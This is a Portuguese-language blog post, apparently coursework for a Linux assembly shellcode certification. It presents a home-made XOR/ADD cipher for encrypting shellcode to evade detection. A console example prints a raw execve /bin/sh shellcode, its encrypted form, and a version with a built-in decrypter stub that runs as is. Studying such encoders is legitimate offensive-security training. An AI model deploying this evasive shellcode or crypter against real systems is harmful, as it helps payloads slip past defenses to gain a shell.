---
layout: post
title: SLAE - 7th Assignment - Crypted Shellcodes
date: '2013-04-29T12:03:00.000-03:00'
author: geyslan
tags: [slae, shellcode, linux, code, assembly, python, cryptography, hacking, portuguese]
modified_time: '2013-08-22T13:17:25.039-03:00'
blogger_id: tag:blogger.com,1999:blog-2541885528459487831.post-2083288330686489851
blogger_orig_url: http://www.hackingbits.com/2013/04/slae-7th-assignment-crypted-shellcodes.html
---

*/\*<br>
Este post é uma sequência. Para melhor entendimento, vejam:<br>
[SLAE - 1st Assignment - Shell Bind TCP](/slae-1st-assignment-shell-bind-tcp.html)<br>
[Hacking do Dia - Shell Bind TCP Random Port](/hacking-do-dia-shell-bind-tcp-random.html)<br>
[SLAE - 2nd Assignment - Shell Reverse TCP](/slae-2nd-assignment-shell-reverse-tcp.html)<br>
[O menor do mundo? Yeah? So Beat the Bits!](/o-menor-do-mundo-yeah-so-beat-bits.html)<br>
[SLAE - 3rd Assignment - Caçando Ovos?](/slae-3rd-assignment-cacando-ovos.html)<br>
[SLAE - 4th Assignment - Encoding and Decoding Gollums](/slae-4th-assignment-encoding-and.html)<br>
[SLAE - 5th Assignment - Metasploit Shellcodes Analysis](/slae-5th-assignment-metasploit.html)<br>
[SLAE - 6th Assignment - Polymorphic Shellcodes](/slae-6th-assignment-polymorphic.html)<br>
\*/*

<!--more-->

*This blog post has been created for completing the requirements of the
SecurityTube Linux Assembly Expert certification:*

*[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)*

*Student ID: SLAE-237*

*Códigos deste post estão no [GitHub](https://github.com/geyslan/SLAE/tree/master/7th.assignment)*.

*Shell-Storm:<br>
[Tiny Execve Sh](http://shell-storm.org/shellcode/files/shellcode-841.php)<br>
[Insertion Decoder Shellcode](http://shell-storm.org/shellcode/files/shellcode-840.php)*

##The Last Mission

Finalmente, o último assignment.

###7th assignment

- Criar um crypter customizado.
- Utilizar qualquer esquema de criptografia existente.
- Usar qualquer linguagem de programação.

##Criptografia!

O vídeo sobre o assunto demonstra um encrypter e um decrypter, construídos em C,
que usam o algoritmo de fluxo [RC4](http://en.wikipedia.org/wiki/RC4) para
processar o shellcode. De início eu não contemplei a que fim serviria um
shellcode critptografado que não conteria seu decrypter embutido, portanto,
agradeço ao Pedro Fausto pela objetiva explanação que me deixou inteirado das
possíveis finalidades: uso na comunicação entre dois pontos já comprometidos;
uso entre um bastião e seus zumbis... Em suma, para qualquer uso evasivo entre
pontos!

Encontrei um algoritmo candidato para a implementação do crypter: [TEA - Tiny
Encryption Algorithm](http://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm).
Entretanto, vi que ele não seria viável por conta do tamanho que ele teria em
[assembly](http://nayuki.eigenstate.org/page/tiny-encryption-algorithm-in-x86-assembly);
haja vista não ter aberto mão de criar o built-in decrypter.

Só tinha uma maneira, criar meu próprio tiny
[cipher](http://en.wikipedia.org/wiki/Cipher).

##Uzumaki Cipher (Swirling Everything)

Usei os moldes da [Stream Cipher](http://en.wikipedia.org/wiki/Stream_cipher)
para criar o Uzumaki (うずまき) Cipher; a cifra consiste no processo de um XOR com
um valor estático, seguido de mais um XOR com um valor pseudorandom (keystream),
terminando com o ADD de um valor estático.

###Crypter

**shellcode[x-1] ^ (shellcode[x] ^ xorByte)) + addByte**

###Built-in Decrypter

{% include image.html url="https://raw.github.com/geyslan/SLAE/master/7th.assignment/uzumaki_decrypter.png" desc="Fluxograma do Uzumaki Cipher" %}

O uzumaki cipher é um algoritmo simples que pode ser utilizado com sucesso em
shellcodes quando o assunto é evasão. Devo ressaltar que um dado criptografado,
para sua própria segurança, não deve conter informações que possam levar à
desencriptação; assim, o built-in decrypter do fluxograma acima (no git com
código comentado) foi criado apenas como uma
[PoC](http://en.wikipedia.org/wiki/Proof_of_Concept). Contudo, nada obsta seu
uso.

##Uso

{% highlight console %}
$ ./uzumaki_crypter.py -a 01 -x 5d -s $'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
...
Crypted shellcode:

"\x31\xa6\x64\x4c\x0d\xe7\x08\x65\x1b\x5e\x02\x47\x5e\x1b\x11\x57\x5b\xbb\x38\x74\x11";

0x31,0xa6,0x64,0x4c,0x0d,0xe7,0x08,0x65,0x1b,0x5e,0x02,0x47,0x5e,0x1b,0x11,0x57,0x5b,0xbb,0x38,0x74,0x11

Crypted shellcode with decrypter built-in:

"\x29\xc9\x74\x14\x5e\xb1\x14\x46\x8b\x06\x83\xe8\x01\x34\x5d\x32\x46\xff\x88\x06\xe2\xf1\xeb\x05\xe8\xe7\xff\xff\xff\x31\xa6\x64\x4c\x0d\xe7\x08\x65\x1b\x5e\x02\x47\x5e\x1b\x11\x57\x5b\xbb\x38\x74\x11";

0x29,0xc9,0x74,0x14,0x5e,0xb1,0x14,0x46,0x8b,0x06,0x83,0xe8,0x01,0x34,0x5d,0x32,0x46,0xff,0x88,0x06,0xe2,0xf1,0xeb,0x05,0xe8,0xe7,0xff,0xff,0xff,0x31,0xa6,0x64,0x4c,0x0d,0xe7,0x08,0x65,0x1b,0x5e,0x02,0x47,0x5e,0x1b,0x11,0x57,0x5b,0xbb,0x38,0x74,0x11
{% endhighlight %}

##Fim!?

É isso aí pessoal! Essa foi a última missão do curso SLAE! E até que foi
simples, porque no decorrer dos posts, aprendemos muitas formas de utilizar a
linguagem assembly para a criação de vários tipos de shellcodes.

Espero que tenham gostado!

[]

##Mais Informações

[SLAE - SecurityTube Linux Assembly Expert](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)<br>
[Get shellcode of the binary using objdump - Andrey Arapov](http://www.commandlinefu.com/commands/view/12151/get-shellcode-of-the-binary-using-objdump#comment)<br>
[RC4](http://en.wikipedia.org/wiki/RC4)<br>
[Tiny Encryption Algorithm](http://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm)<br>
[Cipher](http://en.wikipedia.org/wiki/Cipher)<br>
[Stream Cipher](http://en.wikipedia.org/wiki/Stream_cipher)<br>
[Uzumaki - Denshi Jisho](http://jisho.org/words?jap=uzumaki&eng=&dict=edict)<br>
